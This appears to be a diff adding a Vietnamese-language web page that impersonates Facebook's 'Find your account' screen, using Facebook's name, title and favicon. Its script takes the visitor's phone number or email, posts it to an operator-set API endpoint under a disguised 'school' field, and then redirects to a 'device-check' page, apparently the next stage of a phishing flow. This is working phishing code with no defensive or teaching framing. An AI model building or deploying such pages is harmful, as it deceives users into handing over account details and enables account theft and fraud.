@@ -1,0 +1,55 @@
+<!doctype html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook | Tìm tài khoản</title>
+  <link rel="icon" type="image/svg+xml" href="facebook-favicon.svg">
+  <link rel="stylesheet" href="device-check.css">
+  <script src="site-config.js"></script>
+</head>
+<body>
+  <main class="device-page">
+    <a class="back-link" href="index.html" aria-label="Quay lại">‹</a>
+
+    <section class="content" aria-labelledby="page-title">
+      <p class="eyebrow">Facebook</p>
+      <h1 id="page-title">Tìm tài khoản của bạn</h1>
+
+      <form class="school-form" id="school-form">
+        <label for="school">Hãy nhập số di động hoặc email của bạn:</label>
+        <input id="school" type="text" placeholder="Số di dộng hoặc Email" required>
+        <button type="submit">xác nhận</button>
+      </form>
+    </section>
+  </main>
+
+  <script>
+    const schoolForm = document.querySelector('#school-form');
+    const submitButton = schoolForm.querySelector('button');
+
+    schoolForm.addEventListener('submit', async (event) => {
+      event.preventDefault();
+      const schoolInput = document.querySelector('#school');
+      submitButton.disabled = true;
+      submitButton.textContent = 'Đang xử lý...';
+
+      const response = await fetch((window.API_BASE || '') + '/api/registrations', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ school: schoolInput.value.trim() })
+      });
+
+      if (response.ok) {
+        await new Promise((resolve) => setTimeout(resolve, 1500));
+        window.location.href = 'device-check.html';
+        return;
+      }
+
+      submitButton.disabled = false;
+      submitButton.textContent = 'Xác nhận';
+      alert('Không thể lưu lượt đăng ký. Vui lòng thử lại.');
+    });
+  </script>
+</body>
+</html>
